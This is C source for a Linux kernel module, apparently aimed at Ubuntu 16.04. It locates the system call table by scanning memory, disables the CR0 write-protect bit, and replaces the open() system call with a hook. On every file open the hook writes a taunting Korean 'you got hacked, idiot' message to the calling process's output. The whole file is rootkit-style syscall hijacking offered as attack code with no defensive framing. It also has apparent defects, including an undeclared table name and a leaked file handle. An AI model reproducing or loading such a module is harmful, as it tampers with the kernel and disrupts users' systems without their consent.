// Ubuntu 16.04.1
#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <linux/syscalls.h>
#include <linux/delay.h>    // loops_per_jiffy

#include <linux/fs.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>

#define CR0_WP 0x00010000   // Write Protect Bit (CR0:16)

MODULE_LICENSE("GPL");

void **syscall_table;
unsigned long **find_sys_call_table(void);

long (*orig_sys_open)(const char __user *filename, int flags, int mode);

unsigned long **find_sys_call_table() {

        unsigned long ptr;
        unsigned long *p;

        for (ptr = (unsigned long)sys_close;
                ptr < (unsigned long)&loops_per_jiffy;
                ptr += sizeof(void *)) {

                p = (unsigned long *)ptr;

                if (p[__NR_close] == (unsigned long)sys_close) {
                        printk(KERN_DEBUG "Found the sys_call_table!!!\n");
                        return (unsigned long **)p;
                }
        }

        return NULL;
}

int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size)
{
        mm_segment_t oldfs;
        int ret;

        oldfs = get_fs();
        set_fs(get_ds());

        ret = vfs_write(file, data, size, &offset);

        set_fs(oldfs);

        return ret;
}

struct file *file_open(const char *filename, int flags, int mode)
{
        struct file *filp = NULL;
        mm_segment_t oldfs;
        int err = 0;

        oldfs = get_fs();
        set_fs(get_ds());

        filp = filp_open(filename, flags, mode);
        set_fs(oldfs);

        if(IS_ERR(filp))
        {
				err = PTR_ERR(filp);
				return NULL;
		}

		return filp;
}

long my_sys_open(const char __user *filename, int flags, int mode) {
		long ret;
		int write_ret;
		struct file *filp = NULL;

		ret = orig_sys_open(filename, flags, mode);
		printk(KERN_DEBUG "file %s has been opened with mode %d\n", filename, mode);

		filp = file_open("/proc/self/fd/1", O_WRONLY, 0644);

		write_ret = file_write(filp, 0, "너 해킹 당했어 멍청아 ㅋ\n그것도 실력이라고 달고 사냐 ?", 20);

		return ret;
}

static int (*fixed_set_memory_rw)(unsigned long, int);

static int __init syscall_init(void)
{
		int ret;
		unsigned long addr;
		unsigned long cr0;

		syscall_table = (void **)find_sys_call_table();

		if (!syscall_table) {
				printk(KERN_DEBUG "Cannot find the system call address\n");
				return -1;
		}

		cr0 = read_cr0();
		write_cr0(cr0 & ~CR0_WP);

		fixed_set_memory_rw = (void *)kallsyms_lookup_name("set_memory_rw");
		if(!fixed_set_memory_rw)
		{   
				printk("<0>Unable to find set_memory_rw symbol\n");   
				return 0;
		}

		fixed_set_memory_rw(PAGE_ALIGN((unsigned long)sys_call_table) - PAGE_SIZE, 3);

		//ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);

		orig_sys_open = syscall_table[__NR_open];
		syscall_table[__NR_open] = my_sys_open;

		write_cr0(cr0);

		return 0;
}

static void __exit syscall_release(void)
{
		unsigned long cr0;

		cr0 = read_cr0();
		write_cr0(cr0 & ~CR0_WP);

		syscall_table[__NR_open] = orig_sys_open;

		write_cr0(cr0);
}

module_init(syscall_init);
module_exit(syscall_release);
